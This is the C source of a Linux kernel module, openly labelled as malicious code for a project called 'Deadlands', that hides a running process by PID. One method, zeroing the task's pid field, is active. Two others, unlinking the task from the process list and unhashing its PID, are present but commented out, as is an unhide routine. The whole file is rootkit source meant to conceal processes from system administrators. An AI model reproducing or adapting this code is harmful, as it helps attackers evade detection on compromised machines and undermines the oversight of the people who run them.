/*
** hideProcess.c for ** MALICIOUS CODE: PROJECT - DEADLANDS **
** 
** Made by majdi
** Login   <majdi.toumi@gmail.com>
** 
*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>

#include "hideProcess.h"

/*
** ~ INFORMATIONS:
*/
MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("[ EpiTek4 ] Strasbourg");

/*
** Initializations:
*/
unsigned char		method = 0x4;
struct task_struct	*task = NULL;

static int	hideProcess_init(void)
{
  printk(KERN_ALERT "[MSG] deadlands - module entry\n");
  hideProcess();
  return (0);
}

static void	hideProcess_exit(void)
{

}

int		hideProcess(void)
{
  if (nPID != -1)
    {
      task = find_task_by_pid(nPID);
      if (task != NULL)
	{
	  //write_lock_irq(&tasklist_lock);

	  printk(KERN_ALERT "[MSG] deadlands - addr task pid #%d = [0x%p]\n", nPID, task);
	  if (method & 0x01)
	    {
	      printk(KERN_ALERT "[MSG] deadlands - removing process from list\n");
	      //REMOVE_LINKS(task);
	    }
	  else if (method & 0x02)
	    {
	      printk(KERN_ALERT "[MSG] deadlands - unhashing pid\n");
	      //unhash_pid(task);
	    }
	  else if (method & 0x04)
	    {
	      printk(KERN_ALERT "[MSG] deadlands - zerofing pid\n");
	      task->pid = 0;
	    }

	  //write_unlock_irq(&tasklist_lock);
	}
    }
/*   else if (task != NULL) */
/*     { */
/*       printk ( "[HP] unhideing task at addr 0x%p\n" , task) ; */
/*       write_lock_irq(&tasklist_lock); */
/*       if (method & 0x1) */
/* 	{ */
/* 	  printk("[HP] setting process links\n"); */
/* 	  SET_LINKS(task); */
/* 	} */
/*       if (method & 0x2) */
/* 	{ */
/* 	  printk("[HP] hashing pid\n"); */
/* 	  hash_pid(task); */
/* 	} */
/*       if (method & 0x4) */
/* 	{ */
/* 	  printk ( "[HP] reverting 0 pid to %i\n" , task->tgid); */
/* 	  task->pid = task->tgid; */
/* 	} */
/*       write_unlock_irq(&tasklist_lock) ; */
/*     } */
  return (-1);
}

module_init(hideProcess_init);
module_exit(hideProcess_exit);

/* MODULE_PARM(pid, "i"); */
/* MODULE_PARM_DESC(pid , "the pid to hide"); */

/* MODULE_PARM(task, "l"); */
/* MODULE_PARM_DESC(task, "the address of the task struct to unhide"); */

/* MODULE_PARM (method, "b"); */
/* MODULE_PARM_DESC(method, "a bitwise OR of the method to use , 0x1 - linked list , 0x2 - pidhash , 0x4 - zerofy pid"); */

/* MODULE_AUTHOR("EpiTek4"); */
/* MODULE_DESCRIPTION("hp - hide pid v1.0.0 - hides a task with 3 possible methods"); */
/* MODULE_LICENSE("GPL"); */
/* EXPORT_NO_SYMBOLS; */
